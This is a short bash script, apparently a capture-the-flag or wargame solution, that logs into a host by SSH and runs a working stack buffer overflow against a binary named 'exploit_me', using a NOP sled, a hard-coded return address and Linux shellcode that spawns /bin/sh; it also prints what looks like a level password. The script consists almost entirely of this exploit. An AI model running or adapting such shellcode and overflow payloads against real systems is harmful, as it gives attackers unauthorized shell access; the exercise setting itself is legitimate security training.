#!/bin/bash
echo the pass is 646da671ca01bb5d84dbb5fb2238dc8e
ssh zaz@$1 \(echo whoami \; cat - \)\| env -i SHELLCODE=$(python -c 'print "\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"') PWD=\$PWD \$PWD/exploit_me $(python -c 'print "\x90" * 140 + "\xbf\xff\xff\xc3"[::-1] ')
